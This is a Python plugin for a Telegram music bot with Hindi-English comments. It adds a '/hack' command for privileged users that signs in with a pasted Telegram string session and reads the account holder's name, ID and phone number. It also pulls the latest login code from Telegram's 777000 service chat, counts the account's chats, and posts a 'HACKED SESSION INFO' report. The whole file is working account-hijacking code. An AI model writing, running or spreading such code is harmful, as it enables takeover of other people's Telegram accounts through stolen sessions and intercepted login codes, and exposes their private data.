import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded, SessionRevoked

# --- AAPKE IMPORTS (Fixed) ---
from PritiMusic import app
from PritiMusic.misc import SUDOERS
from config import API_ID, API_HASH

@app.on_message(filters.command(["hack", "checksession", "cs"]) & SUDOERS)
async def check_user_session(client, message: Message):
    # 1. Command Check
    if len(message.command) < 2:
        return await message.reply_text(
            "⚠️ **Format Galat Hai!**\n\n"
            "Use: `/hack STRING_SESSION`"
        )

    session_string = message.text.split(None, 1)[1]
    status_msg = await message.reply_text("🕵️ **Checking Session...**\n`Please wait...`")

    # 2. Temporary Client (RAM Only)
    # Hum naya client banayenge taaki main bot par load na aaye
    temp_client = Client(
        name="temp_session_checker",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
        in_memory=True,  # RAM me chalega
        no_updates=True  # Updates nahi chahiye
    )

    try:
        await temp_client.start()
        
        # --- DATA NIKALNA SHURU ---
        
        # A. Basic Info
        me = await temp_client.get_me()
        user_name = me.first_name
        user_id = me.id
        phone_number = me.phone_number if me.phone_number else "Hidden"
        is_premium = "✅ Yes" if me.is_premium else "❌ No"

        # B. OTP Check (777000)
        otp_msg = "Nahi mila (Chat Empty/Deleted)"
        try:
            async for msg in temp_client.get_chat_history(777000, limit=1):
                if msg.text:
                    otp_msg = f"`{msg.text}`"
                else:
                    otp_msg = "Format Not Supported"
        except:
            otp_msg = "❌ Access Denied"

        # C. Stats Count (Fast Method)
        privates = 0
        groups = 0
        channels = 0
        bots = 0
        
        # Limit 200 taaki bot hang na ho
        async for dialog in temp_client.get_dialogs(limit=200):
            chat_type = dialog.chat.type
            if chat_type.name == "PRIVATE":
                privates += 1
            elif chat_type.name in ["GROUP", "SUPERGROUP"]:
                groups += 1
            elif chat_type.name == "CHANNEL":
                channels += 1
            elif chat_type.name == "BOT":
                bots += 1

        # --- REPORT TAYYAR ---
        report_text = (
            f"😈 **HACKED SESSION INFO** 😈\n\n"
            f"👤 **Name:** {user_name}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"📱 **Number:** `{phone_number}`\n"
            f"💎 **Premium:** {is_premium}\n\n"
            f"📩 **Last OTP:**\n{otp_msg}\n\n"
            f"📊 **Chats (Recent 200):**\n"
            f"• Pvt: `{privates}` | Grp: `{groups}`\n"
            f"• Ch: `{channels}` | Bot: `{bots}`"
        )
        
        await status_msg.edit_text(report_text)

    except SessionRevoked:
        await status_msg.edit_text("❌ **Error:** Session Revoked/Expired hai.")
    except SessionPasswordNeeded:
        await status_msg.edit_text("❌ **Error:** 2FA Password Laga hai.")
    except Exception as e:
        await status_msg.edit_text(f"❌ **Error:** `{str(e)}`")
    
    finally:
        # Client Stop
        if temp_client.is_connected:
            await temp_client.stop()

